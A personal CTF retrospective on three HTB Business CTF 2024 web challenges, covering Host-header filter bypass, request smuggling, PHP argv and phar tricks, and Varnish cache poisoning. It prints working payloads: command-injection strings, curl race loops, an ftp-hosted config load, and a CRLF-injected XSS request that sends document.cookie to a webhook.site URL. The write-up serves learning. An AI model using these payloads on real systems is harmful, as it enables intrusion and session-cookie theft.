---
layout: post
title: HTB Business CTF 2024 - A Retrospective
---
I played the Hack the Box 2024 Business CTF recently. There are enough writeups out there about it now so I'll just talk about some of the notable points about the challenges I liked. I only worked on Web challenges (of course) including a few Misc that were just Web in disguise.

---

## HTB Proxy

This was a janky custom HTTP server written in Go. Among their custom parsing were two major flaws. The first allowed bypassing IP address restrictions by using a domain in the `Host` header that resolved to a blacklisted IP and the second allowed bypassing the HTTP body validation by appending bytes beyond what is stated in the `Content-Length` header. Let's see these in more detail.

All the important stuff happens in the `handleRequest` function so we'll examine that.

There are some hardcoded responses if the path matches the ascii value of certain byte sequences
```go
	if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
		var serverInfo string = GetServerInfo()
		var responseText string = okResponse(serverInfo)
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
		var responseText string = badReqResponse("Not Allowed")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}
```

These encode to `/server-status` and `flushinterface`. The `GetServerInfo` function is interesting because it returns the IP address the challenge is running on, we can leak the IP this way.

```go
func GetServerInfo() string {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	addrs, err := net.InterfaceAddrs()
	if err != nil {
		addrs = []net.Addr{}
	}

	var ips []string
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				ips = append(ips, ipNet.IP.String())
			}
		}
	}

	ipList := strings.Join(ips, ", ")

	info := fmt.Sprintf("Hostname: %s, Operating System: %s, Architecture: %s, CPU Count: %d, Go Version: %s, IPs: %s",
		hostname, runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), runtime.Version(), ipList)

	return info
}
```

With that in mind let's see the `Host` header validation. There is some basic stuff I won't go into like checking the header is present and the port is valid, but the interesting part is the domain/IP validation. These are done by `isIPv4` and `isDomain` respectively. Both also call `blacklistCheck`.

```go
func isIPv4(input string) bool {
	if strings.Contains(input, string([]byte{48, 120})) {
		return false
	}
	var ipv4Pattern string = `^(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$`
	match, _ := regexp.MatchString(ipv4Pattern, input)
	return match && !blacklistCheck(input)
}

func isDomain(input string) bool {
	var domainPattern string = `^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,})$`
	match, _ := regexp.MatchString(domainPattern, input)
	return match && !blacklistCheck(input)
}

// ...

func blacklistCheck(input string) bool {
	var match bool = strings.Contains(input, string([]byte{108, 111, 99, 97, 108, 104, 111, 115, 116})) || // localhost
		strings.Contains(input, string([]byte{48, 46, 48, 46, 48, 46, 48})) || // 0.0.0.0
		strings.Contains(input, string([]byte{49, 50, 55, 46})) || // 127.
		strings.Contains(input, string([]byte{49, 55, 50, 46})) || // 172.
		strings.Contains(input, string([]byte{49, 57, 50, 46})) || // 192.
		strings.Contains(input, string([]byte{49, 48, 46})) // 10.

	return match
}
```

Following this there will also be a check if the IP is a loopback address

```go
func checkIfLocalhost(address string) (bool, error) {
	IPs, err := net.LookupIP(address)
	if err != nil {
		return false, err
	}

	for _, ip := range IPs {
		if ip.IsLoopback() {
			return true, nil
		}
	}

	return false, nil
}
```

So how to bypass this? I spent quite a while trying to use internal docker hostnames but these did not seem to be configured in the `/etc/hosts` of the container, but despite this failure it got me on the line of thinking, can I use an external hostname and have it resolve to what I want? We already have the IP leak from `/server-status` so we know the target IP. And doing this will bypass `blacklistCheck` as it is performed on the hostname, not the resolved IP of the host. It's not a loopback address either, bypassing `checkIfLocalhost`. Using a service like http://nip.io we can route a request to the challenge IP, e.g.
`Host: 192-168-1-250.nip.io`.

The second flaw is the body validation. I won't go into it much, since the key thing to notice here is the body that the validation is performed on is parsed based on the `Content-Length` header

```go
request.Body = bodyContent[0:contentLengthInt]
```

whereas when the request is forwarded, the entire original byte stream is sent. This allows smuggling another request to the backend Node JS service, which will happily process the second request, I guess it keeps the stream open but I didn't look into it.

From here it is smooth sailing for an easy command injection in the IP library node is using, reading the source on GitHub it is simple to spot. We can't use spaces but `${IFS}` solves that.

## Magicom

This one featured a pretty cool PHP trick that allows passing PHP cli scripts arguments via HTTP parameters. It's already explained really well [here](https://www-leavesongs-com.translate.goog/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp#0x06-pearcmdphp) so I won't retread the same ground, but for a TLDR, we can make a request to http://localhost:1337/cli/cli.php?+arg1+arg2 and they will populate `$_SERVER['argv']` which is used as a fallback for `$argv`.

With this we can trigger some function that lead to reading values from an XML file into a `passthru` sink, so the rest of the challenge becomes getting a valid XML file on the server to use.

So our idea to solve was upload an XML file to `/addProduct` because it leaked the temporary file name (`/tmp/phpoiOcBA`) via a `print_r` call on the request handler, and then win the race condition to abuse the `argv` CLI trick and read the payload from the temporary file before it was deleted.

And it worked!(?) we adapted the seminal [INSOMNIA LFI script](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) to use the CLI trick instead of the LFI an with a couple of hours running it we got our flag.

After the event we found out this wasn't intended at all and the author had left the `print_r` call in by mistake...

The intended solution was:

- php_argc_argv to access cli.php
- bypass image upload with phar payload to insert xml data (containing code injection)
- perform import task with phar://path/to/file/pharname.xml to trigger the exploit

There were also a lot (more) unintendeds for this one I saw on discord:

file name command injection + phar archive with jpg header
@alemmi
```
phar:///path/imagename.jpeg/;/readFlag.
```

`file_exists` accepts all sorts of wrappers (:
@shvedity
```
 /cli/cli.php?-c+ftp://MYHOST/config.xml+-m+backup
```

combination of previous two
@worstjdub
```
/cli/cli.php?--mode+import+--filename+ftp://ANONYMOUSFTPHERE.WHATEVER/?;/readflag
```


Pretty crazy one, write PHP session temporary file with mysql import command syntax, and then win race to import it via cli
@downgrade
```
while [ 1 ]; do curl http://94.237.52.105:44004 -H 'Cookie: PHPSESSID=xxxxx' -F 'PHP_SESSION_UPLOAD_PROGRESS=test \! /readflag>/www/uploads/flag'  -F 'file=@/etc/passwd'; done
```

```
while [ 1 ]; do curl http://94.237.52.105:44004/cli/cli.php?-m+import+-f+/tmp/sess_xxxxx; done
```

similar concept, a jpg/sql polyglot
@worty
```
printf "\xff\xd8\xff\xc0 \! /readflag > /www/uploads/flag ;" > a.jpg
```

## OmniWatch

This challenge was my first time encountering Varnish Proxy, so most of the time was spent trying to understand it's data flow and how the DSL worked.

The challenge had Varnish routing requests to two different backends depending on path. One of these was written in Zig and had a pretty trivial CRLF injection on the `decodedDeviceId`.

```zig
...

fn oracle(req: *httpz.Request, res: *httpz.Response) !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();

    const deviceId = req.param("deviceId").?;
    const mode = req.param("mode").?;
    const decodedDeviceId = try std.Uri.unescapeString(allocator, deviceId);
    const decodedMode = try std.Uri.unescapeString(allocator, mode);

    const latitude = try randomCoordinates();
    const longtitude = try randomCoordinates();

    res.header("X-Content-Type-Options", "nosniff");
    res.header("X-XSS-Protection", "1; mode=block");
    res.header("DeviceId", decodedDeviceId); 

...
```

This allowed setting arbitrary headers on the response coming from the Zig backend back to Varnish, that would cause it to cache the response.

```
...

sub vcl_backend_response {
    if (beresp.http.CacheKey == "enable") {
        set beresp.ttl = 10s;
        set beresp.http.Cache-Control = "public, max-age=10";
    } else {
        set beresp.ttl = 0s;
        set beresp.http.Cache-Control = "public, max-age=0";
    }
}
...
```

But this didn't work at first... I spent a long time reading documentation and finally realised why.

There were two important discoveries that lead to it. The first is in [this](https://varnish-cache.org/docs/trunk/users-guide/vcl-hashing.html) article. If there is a return statement in the `vcl_hash` then flow does not continue to the builtin `vcl_hash` function, so only what is specified in the `vcl_hash` of the custom config is used for the hash key in our case.

```
...
sub vcl_hash {
    hash_data(req.http.CacheKey);
    return (lookup);
}
...
```


The second was how to see these builtin routines that automatically follow the custom ones (except in the above case). You can issue:

```
/usr/sbin/varnishd -x builtin
```

Within these defaults I saw this for `vcl_recv` (Normal flow is `vcl_recv` --> `vcl_hash` )

```
...

if (req.http.Authorization || req.http.Cookie) 
{ 
	/* Not cacheable by default */ 
	return (pass); 
}

...
```

And I had a cookie from the same localhost origin that was caught in Burp so of course my poisoning didn't work.... -.-

Should have been obvious it would not cache with a cookie by default in hindsight I guess.

Well with this solved I could pollute any response with that from the Zig backend. But it is hashing with `hash_data(req.http.CacheKey);` and the bot doesn't set that HTTP header?
Exactly, so if I also don't set that header it is hashing NULL/0 (or some default), which is also the same for the bot so it hits my cache entry anyway.

The XSS payload is:

```
GET /oracle/<svg%20onload=fetch('https%3a%2f%2fwebhook.site%2f06789c59-ec40-4b03-a76b-cafe07409502%2f%3fc%3d'%2bdocument.cookie)>/1%0d%0aCacheKey%3a%20enable%0d%0aAge%3a1%0d%0aContent-Type%3a%20text%2fhtml HTTP/1.1
```

Nothing crazy. The middle path entry gets inserted to response as HTML. The CRLF also sets a Content-Type header because content sniffing was disabled.

The rest of the challenge was boring, a trivial SQL injection to bypass a JWT check and the `os.path.join` path truncation that has been seen many times before.